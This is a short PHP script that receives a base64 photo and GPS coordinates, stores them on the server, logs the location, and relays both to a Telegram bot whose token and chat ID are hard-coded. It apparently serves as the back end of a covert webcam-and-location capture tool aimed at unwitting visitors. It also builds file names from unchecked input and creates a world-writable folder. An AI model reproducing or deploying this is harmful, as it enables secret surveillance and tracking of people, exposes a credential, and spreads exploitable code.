<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $imageData = $_POST['image'];
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    // Decode the base64-encoded image data
    $decodedImageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageData));

    // Save the image to the server in the "Captured" folder with latitude and longitude in the file name
    $folderPath = 'Captured';
    $fileName = 'captured_' . $latitude . '_' . $longitude . '_' . time() . '.jpg';
    $filePath = $folderPath . '/' . $fileName;

    if (!is_dir($folderPath)) {
        mkdir($folderPath, 0777, true);
    }

    file_put_contents($filePath, $decodedImageData);

    // Optionally, you can save the location data to a file or database
    file_put_contents('location_data.txt', "Latitude: $latitude, Longitude: $longitude\n", FILE_APPEND);

    // Telegram Bot API Configuration
    $telegramBotToken = '6601330299:AAHLsveT4OAkGERtrgQ5EzXk4GuTTuZl03E';
    $chatId = '6122336601';  // Replace with the actual chat ID you want to send the message to

    // Send the image to Telegram
    $url = "https://api.telegram.org/bot$telegramBotToken/sendPhoto";
    $postFields = array(
        'chat_id' => $chatId,
        'photo' => curl_file_create($filePath),
        'caption' => "Location: Latitude $latitude, Longitude $longitude"
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);

    // Check for errors
    if (curl_errno($ch)) {
        echo 'Telegram API request error: ' . curl_error($ch);
    } else {
        echo 'Image received, stored on the server, and sent to Telegram.';
    }

    curl_close($ch);
} else {
    echo 'Invalid request.';
}
?>
